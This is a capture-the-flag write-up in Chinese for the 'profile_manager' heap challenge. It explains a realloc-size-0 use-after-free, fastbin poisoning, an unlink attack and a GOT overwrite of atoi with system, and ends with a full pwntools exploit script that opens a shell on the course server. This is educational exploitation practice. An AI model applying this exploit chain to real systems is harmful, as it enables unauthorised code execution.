## profile_manager
### solution
本題沒有什麼能利用的overflow，但`edit_profile`存在漏洞，如下
```c
void edit_profile(){
...
		read(0,buf,16);
		tmp = realloc(p[idx].name,strlen(buf));
		if(!tmp){
			puts("Realloc Error !");
			return ;
		}
```
若是直接傳`"\x00"`可使`strlen(buf)`為0，導致`realloc()`的size為0，則會使`p[idx].name`被`free()`，而此處直接return所以`p[idx].name`並不會被清0，成為dangling pointer。

接著，此時被free的chunk已經進入fastbin中，但我們再次呼叫`edit_profile()`，`realloc()`檢查chunk size發現足夠後並不會重新allocate，因此我們可以仍然可以對`p[idx].name`進行寫入，達到overwrite fastbin link中的`FD`的效果。

利用overwrite fastbin link，我們可以先將兩塊fake chunk寫在descrption中，再使`FD`指向第二塊fake chunk，之後即可allocate拿到該chunk進行unlink。

```
        |-----------|
desc -> | prev_size |
        |    size   |
        |    ...    |
        | prev_size2| <- FD <- fastbin
        |    size2  |
        |-----------|
```
接著必須確定以下資訊：
* heap base
FD必須寫為fake chunk的位址，而fake chunk在heap上，因此必須知道heap base。

類似overwrite FD的道理，我們可以透過free構造fastbin list，使得dangling pointer指向fastbin中的`FD`，即可用`show_profile`將其print出來，再計算出heap base。
需要注意的是不能使dangling指向`p[0]->name`，因為結尾必定是`"\x00"`導致無法print。exploit中是構造`fastbin->chunk0->chunk1`的list，再以`show_profile`讀取chunk0的`FD`(=&chunk1)。

* unlink target
因為`edit_profile`中能修改`desc`的code如下，若是指向的空間一開始即為0則無法寫入任何資料。
```c
read(0, p[idx].desc, strlen(p[idx].desc));
```

由於fake chunk寫在descrption內，target必定是`profile[i]->desc`，unlink後target會指向自己-0x18，而若是以`p[0]->desc`為目標，則會指向到heap下方一小塊全部為0的space。

因此必須選擇`i = 1`以上，則`p[i].desc -> p[i-1].desc`，此時裡面的內容為其他的heap address，至少為3bytes，我們即可將其蓋為`atoi@got`。

成功將desc蓋為`atoi@got`之後，先以`show_profile` leak出libc位址，接著計算出`system`後再同樣以`edit_proflie`寫入，最後在選單輸入`sh`即可拿到shell。

整理步驟為：
1. 構造fastbin list同時寫入fake chunks，leak heap
2. 使fastbin list中的FD指向fake chunk2
3. allocate拿到fake chunk2
4. 對fake chunk2進行unlink，此時某個desc指向前一個desc
5. 將其內容寫為`atoi@got`，再以`show_profile` leak libc
6. 以`edit_profile`將`atoi@got`寫為`system`

### script
```python
#!/usr/bin/env python3
from pwn import *

context(arch="amd64")

#r = process("profile_manager")
binary = ELF("profile_manager")
libc = ELF("libc.so.6")
r = remote("csie.ctf.tw", 10140)

def send(s):
    r.recvuntil(":")
    r.send(s)

def add_profile(name, age, length, desc):
    send("1")
    send(name)
    send(str(age))
    send(str(length))
    send(desc)

def show_profile(idx):
    send("2")
    send(str(idx))

def edit_profile(idx, name, age, desc):
    send("3")
    send(str(idx))
    send(name)
    if name == "\x00":
        return
    send(str(age))
    send(desc)

def del_profile(idx):
    send("4")
    send(str(idx))

target = binary.symbols[b'p'] + 0x28
chunk = p64(0) + p64(0x71) # size + prev_size
chunk += p64(target - 0x18) + p64(target - 0x10) #fd, bk
chunk += b"a" * 0x50
chunk += p64(0x70) + p64(0x20) # prev_size, size(fastbin)

# alloc chunk0, 1
# free chunk1, 0
# fastbin -> chunk0 -> chunk1
add_profile("X", 0x87, 0x90, "aaaa")
add_profile("X", 0x87, 0x90, chunk)
edit_profile(1, "\x00", 0, 0)
edit_profile(0, "\x00", 0, 0)

# leak chunk1, compute heapbase
show_profile(0)
r.recvuntil("Name : ", drop=True)
heapbase = u64(r.recvuntil("\n", drop=True).ljust(8, b'\x00')) - 0xc0
r.recvuntil("Desc : ")

# fastbin -> chunk0 -> fakechunk(base+0x160)
edit_profile(0, p64(heapbase + 0x160), 0x33, "cccc")

# alloc p[2].name = chunk0
# fastbin -> fakechunk
add_profile("X", 0x87, 0x90, "bbbb")
# alloc p[3].name = fakechunk
add_profile("X", 0x87, 0x90, "dddd")
# unlink(p[3].name)
del_profile(3)
# now, p[1].desc -> p[0].desc
# make p[0].desc = atoi@got
edit_profile(1, "66666", 0x33, p64(binary.got[b'atoi']))
# leak atoi, compute system
show_profile(0)
r.recvuntil("Desc : ", drop=True)
atoi = u64(r.recv(6).ljust(8, b'\x00'))
system = atoi - libc.symbols[b'atoi'] + libc.symbols[b'system']
# make atoi@got = system
edit_profile(0, "X", 0x87, p64(system))

r.interactive()
# run sh
```
